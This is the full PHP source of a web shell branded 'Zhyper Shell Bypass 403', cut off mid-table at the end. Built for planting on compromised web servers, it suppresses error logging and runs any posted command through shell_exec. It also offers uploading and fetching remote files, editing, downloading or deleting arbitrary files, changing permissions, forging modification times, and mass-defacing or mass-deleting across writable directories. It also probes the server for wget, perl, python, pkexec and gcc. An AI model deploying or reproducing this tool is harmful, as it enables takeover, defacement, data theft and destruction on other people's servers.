<?php
/* Mau recode? izin dulu, recode ga izin itu ga keren ajg | by zhyper*/
set_time_limit(0);
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
date_default_timezone_set('Asia/Jakarta');
$_n = 'Zhyper';
$_s = "<style>table{display:none;}</style><div class='table-responsive'><hr></div>";
$_r = "required='required'";
$_x = "<i class='bi bi-gear-fill'></i>";
if(isset($_GET['option']) && $_POST['opt'] == 'download'){
	header('Content-type: text/plain');
	header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
echo(file_get_contents($_POST['path']));
exit();
}
function ▟($dir,$p) {
if(isset($_GET['path'])) {
	$▚ = $_GET['path'];
} else {
	$▚ = getcwd();
}
if(is_writable($▚)) {
	return "<gr>".$p."</gr>";
} else {
	return "<rd>".$p."</rd>";
	}
}
function ok(){
	echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function er(){
	echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function sz($byt){
	$sz = array('B', 'KB', 'MB', 'GB', 'TB');
	for($i = 0; $byt >= 1024 && $i < (count($sz) -1 ); $byt /= 1024, $i++ );
	return(round($byt,2)." ".$sz[$i]);
}
function ip() {
	$ipas = '';
if(getenv('HTTP_CLIENT_IP'))
	$ipas = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ipas = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ipas = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ipas = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ipas = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ipas = getenv('REMOTE_ADDR');
else
	$ipas = 'IP tidak dikenali';
return $ipas;
}
function p($file){
	$p = fileperms($file);
	if (($p & 0xC000) == 0xC000) {
	$i = 's';
	} elseif (($p & 0xA000) == 0xA000) {
	$i = 'l';
	} elseif (($p & 0x8000) == 0x8000) {
	$i = '-';
	} elseif (($p & 0x6000) == 0x6000) {
	$i = 'b';
	} elseif (($p & 0x4000) == 0x4000) {
	$i = 'd';
	} elseif (($p & 0x2000) == 0x2000) {
	$i = 'c';
	} elseif (($p & 0x1000) == 0x1000) {
	$i = 'p';
	} else {
	$i = 'u';
		}
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ?
	(($p & 0x0800) ? 's' : 'x' ) :
	(($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p &0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ?
	(($p & 0x0400) ? 's' : 'x' ) :
	(($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ?
	(($p & 0x0200) ? 't' : 'x' ) :
	(($p & 0x0200) ? 'T' : '-'));
	return $i;
	}
echo "
<!DOCTYPE HTML>
<html>
	<head>
		<meta name='author' content='$_n'>
		<meta name='robots' content='noindex,nofollow'>
		<title>".$_SERVER['HTTP_HOST']." - $_n</title>
		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
		<link rel='stylesheet' href='//random-php.ftp.sh/style.css'>
		<link href='https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css' rel='stylesheet'>
		<link href='https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css' rel='stylesheet'>
		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
		<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
	</head>
<style>
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap');
*{
	font-family: 'Poppins', sans-serif;
	font-weight: 400;
}
gr {
	color: green;
}
rd {
	color: red;
}
corner {
	position: relative;
}
.shell {
	border-radius: 4px;
	border: 1px solid rgba(255, 255, 255, 0.4);
	font-size: 10pt;
	display: flex;
	flex-direction: column;
	align-items: stretch;
	background: #242424;
	color: #fff;
    font-size: 12px;
    background-color:rgb(0, 0, 0); /* Warna latar belakang */
    color:rgb(145, 255, 0); /* Warna teks */
    padding: 10px;
    border-radius: 5px;
    overflow: auto; /* Tambahkan scroll jika output terlalu panjang */
    white-space: pre-wrap; /* Bungkus teks jika terlalu panjang */
}
.pre {
	height: 500px;
	overflow: auto;
	white-space: pre-wrap;
	flex-grow: 1;
	margin:10px auto;
	padding:10px;
	line-height:1.3em;
	overflow-x:scroll;
}
.btn {
    color: white !important; /* Pastikan teks terlihat */
    opacity: 1 !important; /* Pastikan tombol tidak transparan */
    visibility: visible !important; /* Pastikan tombol terlihat */
    font-size: 14px; /* Ukuran font yang cukup besar */
    text-indent: 0; /* Pastikan teks tidak bergeser */
    text-align: center; /* Pastikan teks berada di tengah */
}
</style>
<body class='bg-secondary text-light'>
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<div class='corner text-secondary'>Zhyper Shell Bypass 403</div>
				<a class='text-decoration-none text-light' href='".$_SERVER['PHP_SELF']."'><h4>$_n Shell</h4></a>";
				if (isset($_GET['path'])) {
					$path = $_GET['path'];
					if (!is_dir($path)) {
						$path = getcwd();
					}
					chdir($path);
				} else {
					$path = getcwd();
				}
				$path = str_replace("\\", "/", $path);
				$paths = explode('/',$path);
				foreach($paths as $id=>$pat){
				if($pat == '' && $id == 0){
					echo '<div class="table-responsive"><i class="bi bi-hdd-rack"></i> : <a class="text-decoration-none text-light" href="?path=/">/</a>';
				continue;
				}
				if($pat == '') continue;
					echo '<a class="text-decoration-none" href="?path=';
				for($i=0;$i<=$id;$i++){
					echo "$paths[$i]";
				if($i != $id) echo "/";
				}
				echo '">'.$pat.'</a>/';
				}
				$kernel = php_uname();
				$user = get_current_user();
				$uid = getmyuid();
				$gid = getmygid();
				$phpver = PHP_VERSION;
				$phpos = PHP_OS;
				$soft = $_SERVER["SERVER_SOFTWARE"];
				$domen = $_SERVER["SERVER_NAME"];
				$ip = gethostbyname($_SERVER['HTTP_HOST']);
				$yip = $_SERVER['REMOTE_ADDR'];
				$disfunc = @ini_get("disable_functions");
				$disfc = empty($disfunc) ? "<gr>NONE</gr>" : "<rd>$disfunc</rd>";
				$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
				$city = "Tidak Diketahui";

				$rib = "http://ip-api.com/json/{$yip}?fields=city";
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, $rib);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				$response = curl_exec($ch);
				curl_close($ch);
				$data = json_decode($response, true);
				if (isset($data['city'])) {
					$city = $data['city'];
				}

				$sql = function_exists('mysql_connect') ? "<span style='color: green;'>ON</span>" : "<span style='color: red;'>OFF</span>";
				$curl = function_exists('curl_version') ? "<span style='color: green;'>ON</span>" : "<span style='color: red;'>OFF</span>";
				$wget = (shell_exec('wget --help')) ? "<span style='color: green;'>ON</span>" : "<span style='color: red;'>OFF</span>";
				$pl = (shell_exec('perl --help')) ? "<span style='color: green;'>ON</span>" : "<span style='color: red;'>OFF</span>";
				$py = (shell_exec('python --help')) ? "<span style='color: green;'>ON</span>" : "<span style='color: red;'>OFF</span>";
				$pxex = (shell_exec('pkexec --version')) ? "<span style='color: green;'>ON</span>" : "<span style='color: red;'>OFF</span>";
				$gcc = (shell_exec('gcc --version')) ? "<span style='color: green;'>ON</span>" : "<span style='color: red;'>OFF</span>";
				$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<span style='color: red;'>ON</span>" : "<span style='color: green;'>OFF</span>";
				echo " [ ".▟($path, p($path))." ]</div>";
			echo "
		</div>
	</div>
</div>
<div class='container-fluid'>
<div class='corner anu py-3'>
    <button class='btn btn-outline-light btn-sm' data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>
    <i class='bi bi-info-circle'></i> Info Server <i class='bi bi-chevron-down'></i>
    </button>
</div>
<div class='collapse text-dark mb-3' id='collapseExample'>
    <div class='box shadow bg-light p-3 rounded-3'>
    System: <gr>$kernel</gr><br>
    User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br>
    PHP Version: <gr>$phpver</gr> PHP os: <gr>$phpos</gr><br>
    Software: <gr>$soft</gr><br>
    Domain: <gr>$domen</gr><br>
    Server Ip: <gr>$ip</gr><br>
    Your Ip: <gr>$yip</gr><br>
    City: <gr>{$city}</gr><br>
    Safe Mode: $sm<br>
    MySQL: $sql | Perl: $pl | WGET: $wget | CURL: $curl | Python: $py | Pkexec: $pxex | GCC: $gcc<br>
    Disable Function:<br><pre>$disfc</pre>
    </div>
</div>
	<div class='box shadow bg-dark p-4 rounded-3'>
		<div class='text-center'>
			<br><a class='btn btn-outline-light btn-sm' href='?id=upload&path=$path'><i class='bi bi-upload'></i> Upload</a>
			<a class='btn btn-outline-light btn-sm' href='?id=deface&path=$path'><i class='bi bi-exclamation-diamond'></i> Mass Deface</a>
			<a class='btn btn-outline-light btn-sm' href='?id=delete&path=$path'><i class='bi bi-trash'></i> Mass Delete</a>
			<a class='btn btn-outline-light btn-sm' href='?id=cmd&path=$path'><i class='bi bi-terminal'></i> Console</a>
		</div>";

if(isset($_GET['path'])) {
	$dir = $_GET['path'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);	
for($i = 0; $i <= $c_dir; $i++) {
	$scdir[$i];
	if($i != $c_dir) {
} elseif($_GET['id'] == 'deface'){
echo "$_s";
function mass_kabeh($dir,$namafile,$isi_script) {
if(is_writable($dir)) {
	$dira = scandir($dir);
	foreach($dira as $dirb) {
		$dirc = "$dir/$dirb";
		$▚ = $dirc.'/'.$namafile;
		if($dirb === '.') {
			file_put_contents($▚, $isi_script);
		} elseif($dirb === '..') {
			file_put_contents($▚, $isi_script);
		} else {
			if(is_dir($dirc)) {
				if(is_writable($dirc)) {
					echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
					file_put_contents($▚, $isi_script);
					$▟ = mass_kabeh($dirc,$namafile,$isi_script);
					}
				}
			}
		}
	}
}
function mass_biasa($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$▚ = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($▚, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($▚, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namafile<br>";
						file_put_contents($▚, $isi_script);
					}
				}
			}
		}
	}
}
if($_POST['start']) {
	if($_POST['tipe'] == 'massal') {
	mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
	} elseif($_POST['tipe'] == 'biasa') {
	mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
	}
	echo "<br>";
}
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<form method='POST'>
		<kbd>$_x&nbsp;Mass deface</kbd>
		<br>Tipe:<br>
		<div class='custom-control custom-switch'>
			<input class='custom-control-input' type='checkbox' id='customSwitch' name='tipe' value='biasa'>
			<label class='custom-control-label' for='customSwitch'>Biasa</label>
		</div>
		<div class='custom-control custom-switch'>
			<input class='custom-control-input' type='checkbox' id='customSwitch1' name='tipe' value='massal'>
			<label class='custom-control-label' for='customSwitch1'>Massal</label>
		</div>
			<i class='bi bi-folder'></i> Lokasi:
			<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
			<i class='bi bi-file-earmark'></i> Nama file:
			<input class='form-control btn-sm' type='text' name='d_file' placeholder='nama file' $_r>
			<i class='bi bi-file-earmark'></i> Isi file:
			<textarea class='form-control btn-sm' rows='7' name='script' placeholder='isi file' $_r></textarea>
			<input class='btn btn-dark btn-sm btn-block' type='submit' name='start' value='mass deface'>
		</form>
	</div>
</div>
<br>";
} elseif ($_GET['id'] == 'cmd') {
    $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
    $cmdResult = '';

    if (!empty($cmd)) {
        $cmdResult = shell_exec($cmd . ' 2>&1');
    }

    echo "
    <div class='container-fluid'>
        <div class='card text-dark'>
            <div class='card-header'>
                <kbd><i class='bi bi-terminal'></i> Console</kbd>
            </div>
            <div class='card-body'>
                <form method='POST'>
                    <div class='input-group mb-3'>
                        <span class='input-group-text'>$user@$domen:~$</span>
                        <input class='form-control' type='text' name='cmd' value='" . htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') . "' placeholder='Enter command' style='color: rgb(145, 255, 0); background-color: #000;'>
                        <button class='btn btn-dark' type='submit'><i class='bi bi-arrow-return-right'></i></button>
                    </div>
                </form>";

    if (!empty($cmdResult)) {
        echo "
                <div class='shell'>
                    <pre>" . htmlspecialchars($cmdResult, ENT_QUOTES, 'UTF-8') . "</pre>
                </div>";
    } elseif ($_SERVER['REQUEST_METHOD'] == 'POST') {
        echo "
                <div class='shell'>
                    <pre>No output</pre>
                </div>";
    }

    echo "
            </div>
        </div>
    </div>";
} elseif ($_GET['id'] == 'upload') {
    echo "$_s
    <div class='card text-dark'>
        <div class='card-header'>";
    if (isset($_FILES['file'])) {
        if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
            echo '<strong>Upload</strong> ok! ' . ok() . '</div>';
        } else {
            echo '<strong>Upload</strong> gagal! ' . er() . '</div>';
        }
    }
    echo "
        <form method='POST' enctype='multipart/form-data'>
            <kbd>$_x&nbsp;Upload File</kbd>
            <div class='input-group mb-3'>
                <input class='form-control form-control-sm' style='color: rgb(116, 114, 114); background-color: #000;' type='file' name='file' $_r>
                <button class='btn btn-dark btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
            </div>
        </form>
    ";
    if (isset($_POST['upload_link'])) {
        $file_url = $_POST['file_url'];
        $file_name = basename(parse_url($file_url, PHP_URL_PATH));
        $save_path = $path . '/' . $file_name;

        if (filter_var($file_url, FILTER_VALIDATE_URL)) {
            $file_content = @file_get_contents($file_url);
            if ($file_content !== false) {
                if (file_put_contents($save_path, $file_content)) {
                    echo '<strong>Upload via Link</strong> berhasil! ' . ok() . '</div>';
                } else {
                    echo '<strong>Upload via Link</strong> gagal menyimpan file! ' . er() . '</div>';
                }
            } else {
                echo '<strong>Upload via Link</strong> gagal mengunduh file! ' . er() . '</div>';
            }
        } else {
            echo '<strong>Upload via Link</strong> URL tidak valid! ' . er() . '</div>';
        }
    }

    echo "
        <form method='POST'>
            <kbd>$_x&nbsp;Upload via Link</kbd>
            <div class='input-group mb-3'>
                <input class='form-control form-control-sm' style='color: rgb(145, 255, 0); background-color: #000;' type='url' name='file_url' placeholder='Masukkan URL file' $_r>
                <button class='btn btn-dark btn-sm' type='submit' name='upload_link'><i class='bi bi-cloud-download'></i></button>
            </div>
        </form>
    </div>
</div>
<br>";
} elseif ($_GET['id'] == 'filebaru') {
    echo "$_s";
    if (isset($_POST['bikin'])) {
        $nama_file = $_POST['nama_file'];
        $isi_file = $_POST['isi_file'];
        $file_path = rtrim($path, '/') . '/' . $nama_file;
        $handle = @fopen($file_path, "w");
        if ($handle) {
            fwrite($handle, $isi_file);
            fclose($handle);
            echo '<strong>Buat file</strong> berhasil! ' . ok() . '</div>';
        } else {
            echo '<strong>Buat file</strong> gagal! ' . er() . '</div>';
        }
    }
    echo "
    <div class='card text-dark'>
        <div class='card-header'>
            <kbd>$_x&nbsp;Buat File</kbd>
            <form method='POST'>
                <i class='bi bi-file-earmark'></i> Nama file:
                <input class='form-control form-control-sm' style='color: rgb(145, 255, 0); background-color: #000;' type='text' name='nama_file' placeholder='Nama file' $_r>
                <i class='bi bi-file-earmark'></i> Isi file:
                <textarea class='form-control form-control-sm' style='color: rgb(145, 255, 0); background-color: #000;' name='isi_file' rows='7' placeholder='Isi file' $_r></textarea>
                <input class='btn btn-dark btn-sm btn-block' type='submit' name='bikin' value='Buat'>
            </form>
        </div>
    </div>
    <br>";
} elseif ($_GET['id'] == 'dirbaru') {
    echo "$_s";
    if (isset($_POST['buat'])) {
        $nama_dir = $_POST['nama_dir'];
        $dir_path = rtrim($path, '/') . '/' . $nama_dir;

        if (@mkdir($dir_path)) {
            echo '<strong>Buat direktori</strong> berhasil! ' . ok() . '</div>';
        } else {
            echo '<strong>Buat direktori</strong> gagal! ' . er() . '</div>';
        }
    }
    echo "
    <div class='card text-dark'>
        <div class='card-header'>
            <kbd>$_x&nbsp;Buat Direktori</kbd>
            <form method='POST'>
                <i class='bi bi-folder'></i> Nama direktori:
                <input class='form-control form-control-sm' style='color: rgb(145, 255, 0); background-color: #000;' type='text' name='nama_dir' placeholder='Nama direktori' $_r>
                <input class='btn btn-dark btn-sm btn-block'  type='submit' name='buat' value='Buat'>
            </form>
        </div>
    </div>
    <br>";
} else if($_GET['id'] == 'delete'){
echo "$_s";
function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
	$dira = scandir($dir);
	foreach($dira as $dirb) {
		$dirc = "$dir/$dirb";
		$▚ = $dirc.'/'.$namafile;
		if($dirb === '.') {
			if(file_exists("$dir/$namafile")) {
				unlink("$dir/$namafile");
			}
		} elseif($dirb === '..') {
			if(file_exists("".dirname($dir)."/$namafile")) {
				unlink("".dirname($dir)."/$namafile");
			}
		} else {
			if(is_dir($dirc)) {
				if(is_writable($dirc)) {
					if(file_exists($▚)) {
						echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
						unlink($▚);
						$▟ = hapus_massal($dirc,$namafile);
						}
					}
				}
			}
		}
	}
}
if($_POST['start']) {
	hapus_massal($_POST['d_dir'], $_POST['d_file']);
	echo "<br>";
}
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<form method='POST'>
		<kbd>$_x&nbsp;Mass delete</kbd>
		<br>
		<i class='bi bi-folder'></i> Lokasi:
			<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
				<i class='bi bi-file-earmark'></i> Nama file:
			<div class='input-group mb-3'>
				<input class='form-control btn-sm' type='text' name='d_file' placeholder='nama file' $_r><br>
			<div class='input-group-append'>
				<input class='btn btn-dark btn-sm' type='submit' name='start' value='mass delete'>
			</div>
		</form>
		</div>
	</div>
</div>
<br>";
	}
}
if (isset($_GET['filesrc'])) {
    $file_path = str_replace("\\", "/", $_GET['filesrc']);

    if (isset($_POST['opt'])) {
        if ($_POST['opt'] == 'edit') {
            if (isset($_POST['src'])) {
                $fp = fopen($_POST['path'], 'w');
                if (fwrite($fp, $_POST['src'])) {
                    echo '<strong>Edit</strong> berhasil! ' . ok() . '</div>';
                } else {
                    echo '<strong>Edit</strong> gagal! ' . er() . '</div>';
                }
                fclose($fp);
            }
            echo "
            <form method='POST'>
                <textarea class='form-control form-control-sm' rows='20' name='src' style='color: rgb(145, 255, 0); background-color: #000;'>" . htmlspecialchars(file_get_contents($_POST['path'])) . "</textarea><br />
                <input type='hidden' name='path' value='" . htmlspecialchars($_POST['path']) . "'>
                <input type='hidden' name='opt' value='edit'>
                <input class='btn btn-outline-light btn-sm btn-block' type='submit' value='Save Changes'>
            </form>
			 <div class='mt-3'>
        		<a href='?filesrc=" . urlencode($_POST['path']) . "' class='btn btn-outline-light btn-sm'>
            	<i class='bi bi-eye'></i> Lihat File
        		</a>
			</div>
            <br>";
        } elseif ($_POST['opt'] == 'rename') {
			if (isset($_POST['newname'])) {
				$new_path = dirname($_POST['path']) . '/' . $_POST['newname'];
				if (rename($_POST['path'], $new_path)) {
					echo '<strong>Rename</strong> berhasil! ' . ok() . '</div>';
					echo "
					<div class='mt-3'>
						<a href='?filesrc=" . urlencode($new_path) . "' class='btn btn-outline-light btn-sm'>
							<i class='bi bi-eye'></i> Lihat File
						</a>
					</div>";
				} else {
					echo '<strong>Rename</strong> gagal! ' . er() . '</div>';
				}
			}
			echo "
			<form method='POST'>
				<div class='input-group mb-3'>
					<input class='form-control form-control-sm' name='newname' type='text' style='color: rgb(145, 255, 0); background-color: #000;' value='" . basename($_POST['path']) . "' />
					<input type='hidden' name='path' value='" . htmlspecialchars($_POST['path']) . "'>
					<input type='hidden' name='opt' value='rename'>
					<button class='btn btn-outline-light btn-sm'><i class='bi bi-pencil-fill'></i> Rename</button>
				</div>
			</form>";
		} elseif ($_POST['opt'] == 'change_perm') {
            if (isset($_POST['new_perm'])) {
                $new_perm = octdec($_POST['new_perm']);
                if (chmod($_POST['path'], $new_perm)) {
                    echo '<strong>Permission</strong> berhasil diubah! ' . ok() . '</div>';
                } else {
                    echo '<strong>Permission</strong> gagal diubah! ' . er() . '</div>';
                }
				echo "
            	<div class='mt-3'>
                	<a href='?filesrc=" . urlencode($_POST['path']) . "' class='btn btn-outline-light btn-sm'>
                    	<i class='bi bi-eye'></i> Lihat File
                	</a>
            	</div>";
            }
            echo "
            <form method='POST'>
                <div class='input-group mb-3'>
                    <input class='form-control form-control-sm' style='color: rgb(145, 255, 0); background-color: #000;' type='text' name='new_perm' placeholder='Contoh: 0755' required>
                    <input type='hidden' name='path' value='" . htmlspecialchars($_POST['path']) . "'>
                    <input type='hidden' name='opt' value='change_perm'>
                    <button class='btn btn-outline-light btn-sm'><i class='bi bi-key'></i> Ubah Permission</button>
                </div>
            </form>";
        } elseif ($_POST['opt'] == 'change_time') {
            if (isset($_POST['new_time'])) {
                $new_time = strtotime($_POST['new_time']);
                if ($new_time !== false && touch($_POST['path'], $new_time)) {
                    echo '<strong>Waktu modifikasi</strong> berhasil diubah! ' . ok() . '</div>';
                } else {
                    echo '<strong>Waktu modifikasi</strong> gagal diubah! Pastikan format tanggal benar. ' . er() . '</div>';
                }
				echo "
            	<div class='mt-3'>
                	<a href='?filesrc=" . urlencode($_POST['path']) . "' class='btn btn-outline-light btn-sm'>
                    	<i class='bi bi-eye'></i> Lihat File
                	</a>
            	</div>";
            }
            echo "
            <form method='POST'>
                <div class='input-group mb-3'>
                    <input class='form-control form-control-sm' style='color: rgb(145, 255, 0); background-color: #000;' type='text' name='new_time' placeholder='Format: YYYY-MM-DD HH:MM:SS' required>
                    <input type='hidden' name='path' value='" . htmlspecialchars($_POST['path']) . "'>
                    <input type='hidden' name='opt' value='change_time'>
                    <button class='btn btn-outline-light btn-sm'><i class='bi bi-clock'></i> Ubah Waktu</button>
                </div>
            </form>";
        } elseif ($_POST['opt'] == 'download'){
			$file_path = $_POST['path'];
			if (is_file($file_path)) {
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
				header('Content-Length: ' . filesize($file_path));
				header('Content-type: text/plain');
				header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
				readfile($file_path);
				echo(file_get_contents($_POST['path']));
				exit();
			} else {
				echo '<strong>Download</strong> gagal! File tidak ditemukan. ' . er() . '</div>';
			}
		} elseif ($_POST['opt'] == 'delete') {
			$file_path = $_POST['path'];
			if (unlink($file_path)) {
				echo '<strong>Delete file</strong> berhasil! ' . ok() . '</div>';
			} else {
				echo '<strong>Delete file</strong> gagal! ' . er() . '</div>';
			}
		}
        return;
    }

    echo "<br><b>File Name:</b> " . basename($file_path) . "<br>";
    echo "<b>File Path:</b> " . htmlspecialchars($file_path) . "<br>";
    echo "<b>File Size:</b> " . sz(filesize($file_path)) . "<br>";
	echo "<b>Permission:</b> " . p($file_path) . " (" . substr(sprintf('%o', fileperms($file_path)), -4) . ")<br>";
    echo "<b>Last Modified:</b> " . date("Y-m-d H:i:s", filemtime($file_path)) . "<br><br>";

    echo "
    <div class='btn-group mb-3'>
        <form method='POST' style='display:inline;'>
            <input type='hidden' name='path' value='" . htmlspecialchars($file_path) . "'>
            <input type='hidden' name='opt' value='edit'>
            <button class='btn btn-outline-light btn-sm'><i class='bi bi-pencil-square'></i> Edit</button>
        </form>
        <form method='POST' style='display:inline;'>
            <input type='hidden' name='path' value='" . htmlspecialchars($file_path) . "'>
            <input type='hidden' name='opt' value='rename'>
            <button class='btn btn-outline-light btn-sm'><i class='bi bi-pencil-fill'></i> Rename</button>
        </form>
        <form method='POST' style='display:inline;'>
            <input type='hidden' name='path' value='" . htmlspecialchars($file_path) . "'>
            <input type='hidden' name='opt' value='change_perm'>
            <button class='btn btn-outline-light btn-sm'><i class='bi bi-key'></i> Chmod</button>
        </form>
        <form method='POST' style='display:inline;'>
            <input type='hidden' name='path' value='" . htmlspecialchars($file_path) . "'>
            <input type='hidden' name='opt' value='change_time'>
            <button class='btn btn-outline-light btn-sm'><i class='bi bi-clock'></i> Change Time</button>
        </form>
		<form method='POST' style='display:inline;'>
            <input type='hidden' name='path' value='" . htmlspecialchars($file_path) . "'>
            <input type='hidden' name='opt' value='download'>
            <button class='btn btn-outline-light btn-sm'><i class='bi bi-clock'></i> Download</button>
        </form>
		<form method='POST' style='display:inline;'>
            <input type='hidden' name='path' value='" . htmlspecialchars($file_path) . "'>
            <input type='hidden' name='opt' value='delete'>
            <button class='btn btn-outline-light btn-sm'><i class='bi bi-clock'></i> Delete</button>
        </form>
    </div>";

    echo '<div class="shell pre" id="see"><pre style="font-size:10px;">' . htmlspecialchars(file_get_contents($file_path)) . '</pre></div><br/>';
} elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '<br><b>name : </b>'.basename($_POST['path']);'</br>';
if($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<strong>Rename</strong> ok! '.ok().'</div>';
	} else {
echo '<strong>Rename</strong> gagal! '.er().'</div>';
}
$_POST['name'] = $_POST['newname'];
}
echo '
<form method="POST">
	<div class="input-group mb-3">
		<input class="form-control form-control-sm" name="newname" type="text" value="'.$_POST['name'].'" />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="hidden" name="opt" value="rename">
		<button class="btn btn-outline-light btn-sm">
			<i class="bi bi-pencil-fill"></i> Rename
		</button>
	</div>
</form>';
} elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<strong>Edit</strong> ok! '.ok().'</div>';
	} else {
echo '<strong>Edit</strong> gagal! '.er().'</div>';
}
fclose($fp);
}
echo '
<form method="POST">
	<textarea class="form-control form-control-sm" rows="7" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="hidden" name="opt" value="edit">
	<input class="btn btn-outline-light btn-sm btn-block" type="submit" value="edit"/>
</form>
<br>';
} elseif ($_POST['opt'] == 'change_time') {
    if (isset($_POST['new_time'])) {
        $new_time = strtotime($_POST['new_time']);
        if ($new_time !== false && touch($_POST['path'], $new_time)) {
            echo '<strong>Waktu modifikasi</strong> berhasil diubah! ' . ok() . '</div>';
        } else {
            echo '<strong>Waktu modifikasi</strong> gagal diubah! Pastikan format tanggal benar. ' . er() . '</div>';
        }
    }
    echo '
    <form method="POST">
        <div class="input-group mb-3">
            <input class="form-control form-control-sm" type="text" name="new_time" placeholder="Format: YYYY-MM-DD HH:MM:SS" required>
            <input type="hidden" name="path" value="' . $_POST['path'] . '">
            <input type="hidden" name="opt" value="change_time">
            <button class="btn btn-outline-light btn-sm" type="submit"><i class="bi bi-clock"></i> Ubah Waktu</button>
        </div>
    </form>';
} elseif ($_POST['opt'] == 'change_perm') {
    if (isset($_POST['new_perm'])) {
        $new_perm = octdec($_POST['new_perm']);
        if (chmod($_POST['path'], $new_perm)) {
            echo '<strong>Permission</strong> berhasil diubah! ' . ok() . '</div>';
        } else {
            echo '<strong>Permission</strong> gagal diubah! ' . er() . '</div>';
        }
    }
    echo '
    <form method="POST">
        <div class="input-group mb-3">
            <input class="form-control form-control-sm" type="text" name="new_perm" placeholder="Contoh: 0755" required>
            <input type="hidden" name="path" value="' . $_POST['path'] . '">
            <input type="hidden" name="opt" value="change_perm">
            <button class="btn btn-outline-light btn-sm" type="submit"><i class="bi bi-key"></i> Ubah Permission</button>
        </div>
    </form>';
}
} else {
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
	echo '<strong>Delete dir</strong> ok! '.ok().'</div>';
	} else {
	echo '<strong>Delete dir</strong> gagal! '.er().'</div>';
	}
} elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
	echo '<strong>Delete file</strong> ok! '.ok().'</div>';
	} else {
	echo '<strong>Delete file</strong> gagal! '.er().'</div>';
		}
	}
}
$scandir = scandir($path);
$pa = getcwd();
echo '<br><div class="table-responsive">
<table class="table table-hover table-dark text-light">
<thead>
<tr>
		<td class="text-center">Name</td>
		<td class="text-center">Last Edit</td>
		<td class="text-center">Size</td>
		<td class="text-center">Owner<gr>/</gr>Downer</td>
		<td class="text-center">Permission</td>
	<td class="text-center">Options</td>
</tr>
</thead>
<tbody class="text-nowrap">
<tr>
